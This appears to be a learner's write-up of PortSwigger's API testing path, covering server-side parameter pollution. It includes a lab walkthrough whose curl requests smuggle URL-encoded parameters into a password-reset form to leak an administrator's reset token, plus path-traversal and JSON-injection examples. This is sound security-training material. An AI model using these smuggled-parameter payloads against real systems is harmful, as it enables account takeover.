# API Testing part 2

This writeup covers the learning path *API_testing* on Portswigger.

## Preventing vulnerabilities in APIs

When designing an API it is important, as with all other software, to think security from the start. Particularly, make sure that documentation is only accessible by those who are authorized to use the API, apply allow lists for HTTP methods, sanitize and validate HTTP headers (Content type). Furthermore using generic error messages or codes will help defend against attackers who can use verbose errors to figure out the system. Protective measures should be used on all versions of the API currently available, not just production.
Also be vary of mass assignment, and only allow assignment to inteded properties.

## Server-side parameter pollution

Much like server-side request forgery (SSRF), this vulnerability allows an attacker to manipulate requests to internal APIs, if the system embeds user input into internal API requests. Server-side parameter pollution allows an attacker to override and modify application data and behavior and might allow access to unauthorized data too.

All types of user input is possibly vulnerable to parameter pollution. Such as:

- Query params
- Form fields
- Headers

and so on.

### Testing for server-side parameter pollution

An example of parameter pollution in the query string could look like this:

- Public query to frontend

```HTTP
GET /userSearch?name=peter&back=/home
```

Server-side then makes the request to an internal API as such:

```HTTP
GET /users/search?name=peter&publicProfile=true
```

It is useful to test the response of the application by providing special characters in the query such as `#` `&` `=`.

**Note:** The special chars should be URL encoded.

We could use the `#` (URL encoded: `%23`) in order to test for query truncation. A truncated query means that the rest of the query is not getting parsed, as we have inserted something else for the backend to parse (in this case the `#` followed by some value e.g `foo`). Using this, we might be able to bypass some checks. It might also prove fruitful to add another query parameter using `&`. If the server parses the extra parameter, it might be useful or just ignored.

If we have identified additional parameters (See part 1), we might be able to parse these in the query string. It might bypass some authentication / authorization.
Parsing more than one of the same query parameter such as `?username=peter&username=admin` might also prove to be valuable, if the server parses the last username when looking in the database, but uses the first for authentication, we might be able to log in as admin.

## Lab: Exploiting server-side parameter pollution in a query string

**Lab Description**: To solve the lab, log in as the `administrator` and delete `carlos`.

### Lab solution

We are not given any log-in. Yet inspecting the login page and trying to log in might give us some information on how the API works. Trying to log in this not result in any information on the API. But the forgot password functionality uses a JS script, which has a query parameter: `/forgot-password?reset_token=${resetToken}`. Immediately this does not provide any useful information. When querying the forgot_password endpoint with a random token, it repsonds with invalid token.

What about the products? Let's try. Here we see the query: `/product?productId=1`. Adding another query param returns `invalid product ID`, which means the backend might concatenate the two fields.

I believe that we have to try again with the forgot password endpoint. It seems that we need to do post requests with form-urlencoded and not look for a api with query params. (I used a hint for this one, as I am not using Burp suite for these labs and I thought that we where searching for a query string in a GET request, not a POST. You learn something new all the time!). To solve this lab I used curl to send the requests to forgot_password:

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator'
{"type":"email","result":"*****@normal-user.net"}%  
```

Now let's manipulate this query. As the previous section informed us, we could try to truncate and add another field! Lets try adding a random field to check out the message we get back first:

**Note:** remember to URL encode!!

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator%26foo=bar'
{"error": "Parameter is not supported."}% 
```

And we see that, this parameter is not supported! Well, maybe a different one is. Where should we start? I thought we could maybe change the email of the admin account to our own (I don't think this is necessary for this challenge, but if it was a real life case) so i tried changing the parameter to email. This did not work and I do not feel like bruteforcing this parameter. Let's try to truncate!

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator%23'              
{"error": "Field not specified."}%  
```

We get the message `Field not specified`. This hints towards that a parameter called `field` can be set:

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator%26field=bar%23'
{"type":"ClientError","code":400,"error":"Invalid field."}% 
```

Now this looks promising!. Maybe email will work as a valid field! it does! 

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator%26field=email%23'
{"type":"email","result":"*****@normal-user.net"}% 
```

We are back to the original response. Recall the forgot_password JS script where we found the reset_token url. We might be able to retrieve a token if we change the field to reset_token:

```bash
curl 'https://0af4001c0430d813821fb5ac009200c7.web-security-academy.net/forgot-password' --compressed -X POST -H 'Content-Type: x-www-form-urlencoded' -H 'Cookie: session=hzwoZGbNrumgHEvMg6reVSMDMOFFt7SX' --data-raw 'csrf=09PhPtnnnM1TOSq1WbVcd6XQUOyUHNOP&username=administrator%26field=reset_token%23'
{"type":"reset_token","result":"2350wzp9hfy9j4ulxdbwzy53ufvn629p"}%   
```

We get a token. Now we can try the reset_token endpoint with our new token! It works, and now a reset password page is presented to us, simply change the administrator password and login, in order to delete carlos.

**Note:** I viewed the rest of the solution hints afterwards and saw that Burp has a parameter bruteforce tool, quite neat! This one was a bit hard for me, because I got tunnel vision looking for a `/api` endpoint with query parameters in it, when in reality all it took was a post request with form-urlencoded.

### Testing for server-side parameter pollution in REST paths

A common practice with RESTful apis is the insertion of parameter names and values directly in the path, rather than in a query string. It looks like this: `/api/users/123` rather than `/api?users=123`.

Injection in this type of api might resolve in undesired behavior as the path can be manipulated. Some frameworks might truncate the path if dots are present: `GET /api/private/users/peter/../admin` will result in `/api/private/users/admin`.

Another practice is injection in structured data formats like JSON and XML. An attacker might be able to add fields to the input which are not sanitized like this: 

```formdata
POST /myaccount
name=peter","access_level":"administrator
```

which then becomes:

```JSON
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```

When the server side request is processed. This can also happen with XML, especially malicious if XXE (XML External Entity injection) is possible.

Preventing parameter pollution is essentially configuring an allowlist which defines characters that don't need encoding and making sure all other user input is encoded before it is included in a server side request.

This conclues the API testing learning path on Portswigger.